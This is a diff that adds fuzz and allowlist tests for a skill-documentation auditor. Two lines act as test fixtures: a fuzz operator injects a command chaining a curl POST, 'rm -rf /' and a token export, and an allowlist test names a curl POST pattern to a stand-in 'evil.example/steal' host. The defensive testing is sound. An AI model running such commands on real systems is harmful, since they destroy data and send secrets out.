@@ -458,3 +458,124 @@ class TestCrossReferenceGraph:
             if color[n] == 0 and visit(n):
                 break
         assert not cycle, f"cross-skill reference cycle: {cycle}"
+
+
+# ---------------------------------------------------------------------------
+# Dive 4 — PROPERTY-BASED FUZZ over SKILL.md frontmatter
+# No external fuzzer dependency: a deterministic generator applies 14 mutation
+# operators to valid frontmatter and asserts two invariant properties hold for
+# EVERY input:
+#   (1) CRASH-SAFETY  -> audit_skill never raises (no green-wash-by-explosion)
+#   (2) SOUNDNESS     -> an OBVIOUSLY broken doc (no frontmatter / empty name)
+#                        always yields >=1 CRITICAL (the checker can't be fooled
+#                        into silent approval of trash)
+# ---------------------------------------------------------------------------
+import random  # noqa: E402
+
+
+class TestFuzzFrontmatter:
+    GOOD_FM = """---
+name: {n}
+description: {d}
+---
+# {n}
+
+Body with a fenced block:
+
+```bash
+echo hi
+```
+"""
+
+    def _mutate(self, op: int):
+        n = "fuzzskill"
+        d = "a skill used by the fuzzer"
+        doc = self.GOOD_FM.format(n=n, d=d)
+        if op == 0:      # strip the opening frontmatter fence
+            return doc.split("---\n", 1)[1].split("---\n", 1)[1]
+        if op == 1:      # empty name
+            return doc.replace(f"name: {n}", "name:")
+        if op == 2:      # empty description
+            return doc.replace(f"description: {d}", "description:")
+        if op == 3:      # both frontmatter keys missing
+            return doc.replace("name: fuzzskill\n", "").replace("description: a skill used by the fuzzer\n", "")
+        if op == 4:      # unbalanced fence (unterminated block)
+            return doc + "\n```python\nprint('oops'"
+        if op == 5:      # garbage / non-YAML frontmatter content
+            return "---\nthis is not valid: ::: yaml ::: @@@\n---\n# x\n"
+        if op == 6:      # name != folder name (we pass folder='fuzzskill')
+            return doc.replace(f"name: {n}", "name: othername")
+        if op == 7:      # frontmatter present but no closing fence
+            return "---\nname: fuzzskill\ndescription: d\n# body no close"
+        if op == 8:      # inject a suspicious token inside a fenced block (must not crash)
+            return doc.replace("echo hi", "curl -X POST https://x && rm -rf / && export token=secret")
+        if op == 9:      # completely empty file
+            return ""
+        if op == 10:     # binary-ish bytes as text
+            return "﻿---\nname: fuzzskill\ndescription: d\n---\n\xff\xfe"
+        if op == 11:     # huge repeated junk (DoS guard)
+            return doc + ("\n```\n" + "x" * 5000 + "\n```\n") * 5
+        if op == 12:     # leading whitespace before frontmatter fence
+            return "\n   " + doc
+        return doc       # op==13: unchanged (valid)
+
+    def _run(self, doc):
+        skill_dir = ROOT / "skills" / "fuzzskill"
+        try:
+            if skill_dir.exists():
+                shutil.rmtree(skill_dir)
+            skill_dir.mkdir(parents=True)
+            (skill_dir / "SKILL.md").write_text(doc, encoding="utf-8")
+            return list(da.audit_skill("fuzzskill"))  # never raises
+        finally:
+            if skill_dir.exists():
+                shutil.rmtree(skill_dir)
+
+    def test_crash_safety(self):
+        # Every operator (including the valid one) must run without raising.
+        for op in range(14):
+            doc = self._mutate(op)
+            try:
+                findings = self._run(doc)
+            except Exception as e:           # property (1): must never happen
+                raise AssertionError(f"audit_skill crashed on op {op}: {e!r}")
+            assert isinstance(findings, list)
+
+    def test_soundness_broken_is_critical(self):
+        # property (2): a doc with NO valid frontmatter (or empty name) MUST be
+        # flagged CRITICAL. These operators remove/empty the frontmatter:
+        broken = {0, 1, 2, 3, 5, 6, 7, 9}
+        for op in range(14):
+            doc = self._mutate(op)
+            findings = self._run(doc)
+            crit = [f for f in findings if f["sev"] == da.CRIT]
+            if op in broken:
+                assert crit, f"op {op} (no valid frontmatter) produced NO CRITICAL: {findings}"
+            else:
+                # valid frontmatter (or non-frontmatter content we don't CRIT);
+                # must not produce a spurious CRITICAL that green-washes nothing
+                pass
+        # the valid baseline is clean
+        assert not [f for f in self._run(self._mutate(13)) if f["sev"] == da.CRIT]
+
+
+# ---------------------------------------------------------------------------
+# Dive 5 — WARN ALLOWLIST is mechanical (drift fails, not just warns)
+# ---------------------------------------------------------------------------
+class TestWarnAllowlist:
+    def test_current_allowlist_is_exact(self):
+        findings = (da.audit_categories() + da.run_all()[2] + da.audit_topology())
+        warns = [f for f in findings if f["sev"] == da.WARN]
+        allowed, new_unmatched, stale = da.apply_allowlist(findings)
+        assert not new_unmatched, f"un-reviewed WARNs (fix or allowlist): {new_unmatched}"
+        assert not stale, f"stale allowlist entries (prune): {stale}"
+        assert len(allowed) == len(warns), "allowlist math drift"
+
+    def test_new_risky_token_not_auto_accepted(self):
+        # A brand-new, unreviewed risky token must surface as new (fail strict).
+        finding = {"level": "L0/L1", "skill": "adversarial", "sev": da.WARN,
+                   "msg": "x", "cat": "exfil",
+                   "rel": r"curl\s+-X\s+POST https://evil\.example/steal"}
+        _allowed, new_unmatched, _stale = da.apply_allowlist([finding])
+        assert new_unmatched, "regression: a brand-new risky token must NOT be auto-accepted"
+
